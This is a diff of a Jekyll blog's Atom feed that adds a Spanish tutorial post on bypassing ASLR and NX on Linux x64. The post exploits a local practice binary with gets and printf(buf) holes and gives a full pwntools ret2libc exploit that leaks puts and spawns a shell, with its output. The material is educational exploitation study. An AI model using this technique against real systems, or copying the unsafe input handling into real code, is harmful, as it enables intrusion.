@@ -1,4 +1,211 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-03T19:18:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Leak stack canary - bypass</title><link href="http://localhost:4000/leak-stack-canary/" rel="alternate" type="text/html" title="Leak stack canary - bypass" /><published>2022-08-03T00:00:00-05:00</published><updated>2022-08-03T00:00:00-05:00</updated><id>http://localhost:4000/leak-stack-canary</id><content type="html" xml:base="http://localhost:4000/leak-stack-canary/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-11T13:13:10-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Bypass ASLR/NX</title><link href="http://localhost:4000/bypass-aslr-nx/" rel="alternate" type="text/html" title="Bypass ASLR/NX" /><published>2022-08-11T00:00:00-05:00</published><updated>2022-08-11T00:00:00-05:00</updated><id>http://localhost:4000/bypass-aslr-nx</id><content type="html" xml:base="http://localhost:4000/bypass-aslr-nx/">&lt;font size=&quot;1&quot;&gt;Hay muchas mas formas de hacer bypass del ASLR, asi que no se queden solo con esta&lt;/font&gt;
+
+&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;ASRL&lt;/li&gt;
+  &lt;li&gt;Analizando el binario&lt;/li&gt;
+  &lt;li&gt;Calculando el offset el RIP&lt;/li&gt;
+  &lt;li&gt;Sacando las direcciones de puts y puts@got&lt;/li&gt;
+  &lt;li&gt;Sacando la direccion de pop rdi; ret&lt;/li&gt;
+  &lt;li&gt;Sacando los offsets de puts, system y sh usando libc&lt;/li&gt;
+  &lt;li&gt;Ejecutando el exploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;aslr&quot;&gt;ASLR&lt;/h2&gt;
+
+&lt;p&gt;La aleatorización de la disposición del espacio de direcciones (ASLR) es una funcion a nivel de kernel la cual permite que las direcciones del stack, librerias, etc, sean diferentes, esto hace que para explotar una vulnerabilidad en un binario se mas dificil&lt;/p&gt;
+
+&lt;h2 id=&quot;analizando-el-binario&quot;&gt;Analizando el binario&lt;/h2&gt;
+
+&lt;p&gt;El codigo del binario es el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;string.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como se puede ver el binario usa la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; la cual no es segura de usar ya que no se controla la cantidad de datos a pasar, es decir que si tenemos un buffer de 100 y le pasamos 120, esos 20 de sobra los seguira almacenando.&lt;/p&gt;
+
+&lt;h2 id=&quot;calculando-el-offset-el-rip&quot;&gt;Calculando el offset el RIP&lt;/h2&gt;
+
+&lt;p&gt;Ya se la saben banda, simplemente tenemos que meter el binario de un debugger, en mi caso usare gdb con &lt;a href=&quot;https://github.com/hugsy/gef&quot;&gt;gef&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora una vez dentro con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern create 150&lt;/code&gt; generaremos 150 carcteres que nos ayudara para sacar el offset del rip, esos caracteres se los pasaremos como input al programa, vemos que el programa peto y se ocasiono el buffer overflow&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401187 in main ()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ahora mostraremos el stack frame con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i f&lt;/code&gt; y vemos que nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;saved rip&lt;/code&gt; vale &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6161616161616170&lt;/code&gt;, esto son algunos de los caracteres que le pasamos de la cadena que se genero pero en hex. Ahora con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patter offset&lt;/code&gt; le pasaremos esa valor para saber el offset:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  patter offset 0x6161616161616170
+[+] Searching for '0x6161616161616170'
+[+] Found at offset 120 (little-endian search) likely
+[+] Found at offset 113 (big-endian search) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos como el offset del RIP es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;120&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sacando-las-direcciones-de-puts-y-putsgot&quot;&gt;Sacando las direcciones de puts y puts@got&lt;/h2&gt;
+
+&lt;p&gt;Ahora viene la parte mas compleja, para esa practica tenemos que hacer 3 cosas&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sacar la direccion de puts@plt&lt;/li&gt;
+  &lt;li&gt;La direccion de main&lt;/li&gt;
+  &lt;li&gt;La direccion de puts@got&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;direccion-de-putsplt&quot;&gt;Direccion de puts@plt&lt;/h3&gt;
+
+&lt;p&gt;Esto lo hacemos ya que necesitamos llamar a puts y afortunadamente no se ve afectada por el ASLR, la primera manera de obtenerlos es poner el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p  puts@plt&lt;/code&gt; en gdb, nos debe de mostrar algo como esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  p 'puts@plt'
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x401030 &amp;lt;puts@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ahi podemos ver que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x401030&lt;/code&gt;.
+Para la segunda forma podemos usar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; de la siguiente manera&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d -M intel vuln | grep &quot;puts@plt&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y nos debe de mostrar algo como esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000000000401020 &amp;lt;puts@plt-0x10&amp;gt;:
+0000000000401030 &amp;lt;puts@plt&amp;gt;:
+  40115f:	e8 cc fe ff ff       	call   401030 &amp;lt;puts@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Vemos que es exactamente la misma direccion.&lt;/p&gt;
+
+&lt;h3 id=&quot;la-direccion-de-main&quot;&gt;La direccion de main&lt;/h3&gt;
+
+&lt;p&gt;Esto es util ya que si el programa se detiene, ahora sabra que la direccion base del ASLR sera random otra vez.
+Para esto en el gdb usaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p main&lt;/code&gt; y nos muesta esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  p main
+$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0x401146 &amp;lt;main&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ahora sabemos que la direccion de main es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x401146&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;direccion-de-putsgot&quot;&gt;Direccion de puts@got&lt;/h3&gt;
+
+&lt;p&gt;La primera forma de conseguirlo es usando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; pero ahora de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump -R vuln&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -R vuln                                                                    06:12:23 
+
+vuln:     formato del fichero elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE 
+0000000000403fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
+0000000000403fe8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable@Base
+0000000000403ff0 R_X86_64_GLOB_DAT  __gmon_start__@Base
+0000000000403ff8 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable@Base
+0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5 &amp;lt;--
+0000000000404020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
+0000000000404028 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Podemos ver que obtuvumos la direccion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@GLIBC&lt;/code&gt;, esto es lo mismo que GOT solo que se obtiene el nombre de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;glibc&lt;/code&gt; ya que es la direccion externa de puts.&lt;/p&gt;
+
+&lt;p&gt;Para la segunda forma usaremos gdb, y la direccion que nos salio de puts@plt mostraremos su contenido con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disassemble 0x401030&lt;/code&gt;, esto nos debe de mostrar esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disassemble 0x401030
+Dump of assembler code for function puts@plt:
+   0x0000000000401030 &amp;lt;+0&amp;gt;:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &amp;lt;puts@got.plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Aun que sean diferentes podemos usar cualquiera de las dos.&lt;/p&gt;
+
+&lt;h2 id=&quot;sacando-la-direccion-de-pop-rdi-ret&quot;&gt;Sacando la direccion de pop rdi; ret&lt;/h2&gt;
+
+&lt;p&gt;Para esta parte usaremos un gadget que nos servira para meter cualquier cosa a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; (si aun no vez el post de ret2libc bypass NX te recomiendo verlo, ahi explico mas a detalle esto de ROP y los gadgets).&lt;/p&gt;
+
+&lt;p&gt;De igual manera podemos hacerlo de dos formas, la primera y mas sencilla es usar ROPgadget con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROPgadget --binary vuln&lt;/code&gt; y buscar donde diga &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi ; ret&lt;/code&gt; (yo lo hare con ROPgadget), y la otra es calcularla a travez de la direccion de puts, esto lo haremos con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf&lt;/code&gt; de esta forma:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;readelf -s /usr/lib/libc.so.6 | grep puts@@
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nos muestra la direccion&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;readelf -s /usr/lib/libc.so.6 | grep puts@@                                        06:39:55 
+   808: 0000000000079280   294 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
+  1429: 000000000007a6f0   409 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+  1438: 000000000007a6f0   409 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y podriamos usar esta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000000000007a6f0&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que deben de modificar es la ruta de libc, la pueden sacar con el comando ldd&lt;/p&gt;
+
+&lt;h2 id=&quot;sacando-los-offsets-de-puts-system-y-binsh-usando-libc&quot;&gt;Sacando los offsets de puts, system y /bin/sh usando libc&lt;/h2&gt;
+
+&lt;p&gt;De igual manera usaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; pero ahora de esta forma&lt;/p&gt;
+
+&lt;p&gt;System&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d -M intel /usr/lib/libc.so.6 | grep &quot;system&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;puts&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d -M intel /usr/lib/libc.so.6 | grep &quot;_IO_puts&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y ambos comandos nos deben de mostrar algo como esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000000000004ba40 &amp;lt;__libc_system@@GLIBC_PRIVATE&amp;gt;:
+000000000007a6f0 &amp;lt;_IO_puts@@GLIBC_2.2.5&amp;gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;/bin/sh&lt;/p&gt;
+
+&lt;p&gt;Para esto usare el comando grep que viene incorporado en gef el comando grep,&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  grep &quot;/bin/sh&quot;
+[+] Searching '/bin/sh' in memory
+[+] In '[heap]'(0x405000-0x426000), permission=rw-
+  0x405ac0 - 0x405ac7  →   &quot;/bin/sh&quot; 
+  0x405ae0 - 0x405ae7  →   &quot;/bin/sh&quot; 
+[+] In '/usr/lib/libc.so.6'(0x7ffff7da0000-0x7ffff7df8000), permission=r--
+  0x7ffff7dbb26a - 0x7ffff7dbb271  →   &quot;/bin/sh&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ejecutando-el-exploit&quot;&gt;Ejecutando el exploit&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./vuln'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0401146&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000404018&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000401030&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004005f3&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;puts_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000007a6f0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000004ba40&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x405ac0&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;puts_libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_libc&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh_libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_libc_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh_libc_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_libc_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y nos debe de mostrar algo como esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 exploit.py                                                      6s  01:07:40 
+[+] Starting local process './vuln': pid 9984
+[*] Switching to interactive mode
+$ whoami
+omarh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bypass-aslr/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ret2libc" /><category term="gdb" /><category term="bof" /><summary type="html">En este articulo veremos como hacer bypass del ASLR y NX en Linux x64</summary></entry><entry><title type="html">Leak stack canary - bypass</title><link href="http://localhost:4000/leak-stack-canary/" rel="alternate" type="text/html" title="Leak stack canary - bypass" /><published>2022-08-03T00:00:00-05:00</published><updated>2022-08-03T00:00:00-05:00</updated><id>http://localhost:4000/leak-stack-canary</id><content type="html" xml:base="http://localhost:4000/leak-stack-canary/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Que es el stack canary y como funciona&lt;/li&gt;
